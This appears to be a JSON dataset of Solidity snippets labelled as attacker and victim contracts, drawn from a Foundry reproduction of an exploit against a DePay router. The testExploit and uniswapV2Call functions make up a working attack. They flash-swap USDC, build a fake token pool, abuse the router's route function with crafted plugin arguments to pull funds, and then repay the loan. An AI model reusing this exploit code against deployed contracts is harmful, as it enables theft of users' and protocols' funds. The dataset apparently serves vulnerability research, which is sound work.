[
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "IS_TEST",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "balanceOf",
    "original_code": "    function balanceOf(\n        address account\n    ) public view virtual returns (uint256) {\n        return balances[account];\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "balances",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "conAddress",
    "original_code": "    function conAddress(address address1, address address2) public pure returns (bytes memory) {\n        bytes32 concatenated;\n        assembly {\n            mstore(concatenated, address1)\n            mstore(add(concatenated, 0x14), address2)\n        }\n        return abi.encodePacked(concatenated);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeArtifacts",
    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeContracts",
    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeSenders",
    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "failed",
    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "setUp",
    "original_code": "    function setUp() public {\n        vm.createSelectFork(\"mainnet\", 18_281_130 - 1);\n        vm.label(address(USDC), \"USDC\");\n        vm.label(address(UNIV2), \"UNIV2: USDC\");\n        vm.label(address(UniRouter), \"UniRouter\");\n        vm.label(address(UniFactory), \"UniFactory\");\n        vm.label(address(DepayRouter), \"DepayRouter\");\n        approveAll();\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifactSelectors",
    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifacts",
    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetContracts",
    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetInterfaces",
    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetSelectors",
    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetSenders",
    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "testExploit",
    "original_code": "    function testExploit() external {\n        uint256 startUSDC = USDC.balanceOf(address(this));\n        console.log(\"Before Start: %d USDC\", startUSDC);\n        UNIV2.swap(amount, 0, address(this), conAddress(address(USDC), address(DepayRouter)));\n\n        uint256 intExp = USDC.balanceOf(address(this)) / 1e6;\n        uint256 decExp = USDC.balanceOf(address(this)) - intExp * 1e6;\n        console.log(\"Attack Exploit: %s.%s USDC\", intExp, decExp);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "transfer",
    "original_code": "    function transfer(address to, uint256 value) public virtual returns (bool) {\n        _transfer(msg.sender, to, value);\n        return true;\n    }\n\n    function transferFrom(address from, address to, uint256 value) public virtual returns (bool) {\n        _transfer(from, to, value);\n        return true;\n    }\n\n    function _transfer(address from, address to, uint256 value) internal {\n        balances[from] -= value;\n        balances[to] += value;\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "transferFrom",
    "original_code": "    function transferFrom(address from, address to, uint256 value) public virtual returns (bool) {\n        _transfer(from, to, value);\n        return true;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "uniswapV2Call",
    "original_code": "    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {\n        uint256 amountAMin = 877_961_918;\n        ERC20ops();\n        uint256 amountA;\n        uint256 amountB;\n        uint256 liquidity;\n        (amountA, amountB, liquidity) =\n            UniRouter.addLiquidity(sender, address(USDC), 1e30, 1, amountAMin, 1, address(this), type(uint256).max);\n        IUniswapV2Pair newUniPair = IUniswapV2Pair(UniFactory.getPair(address(this), address(USDC)));\n\n        address[] memory path = new address[](2);\n        (path[0], path[1]) = (address(USDC), address(this));\n        uint256[] memory amounts = new uint256[](3);\n        (amounts[0], amounts[1], amounts[2]) = (amountAMin, 0, type(uint256).max);\n        address[] memory addresses = new address[](2);\n        (addresses[0], addresses[1]) = (address(this), address(this));\n        address[] memory plugins = new address[](2);\n        (plugins[0], plugins[1]) = (DePayUniV1, DePayUniV1);\n        string[] memory data = new string[](1);\n        DepayRouter.route(path, amounts, addresses, plugins, data);\n\n        newUniPair.approve(address(UniRouter), liquidity);\n        UniRouter.removeLiquidity(address(this), address(USDC), liquidity, 1, 1, address(this), type(uint256).max);\n\n        USDC.transfer(address(UNIV2), amount * 1001 / 997);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IDepayRouterV1",
    "source_type": "victim_contract",
    "function_name": "route",
    "original_code": "  function route(\n    // The path of the token conversion.\n    address[] calldata path,\n    // Amounts passed to proccessors:\n    // e.g. [amountIn, amountOut, deadline]\n    uint[] calldata amounts,\n    // Addresses passed to plugins:\n    // e.g. [receiver]\n    address[] calldata addresses,\n    // List and order of plugins to be executed for this payment:\n    // e.g. [Uniswap,paymentPlugin] to swap and pay\n    address[] calldata plugins,\n    // Data passed to plugins:\n    // e.g. [\"signatureOfSmartContractFunction(address,uint)\"] receiving the payment\n    string[] calldata data\n  ) external payable returns(bool) {\n    uint balanceBefore = _balanceBefore(path[path.length-1]);\n    _ensureTransferIn(path[0], amounts[0]);\n    _execute(path, amounts, addresses, plugins, data);\n    _ensureBalance(path[path.length-1], balanceBefore);\n    return true;\n  }\n\n  // Returns the balance for a token (or ETH) before the payment is executed.\n  // In case of ETH we need to deduct what has been payed in as part of the transaction itself.\n",
    "description": ""
  }
]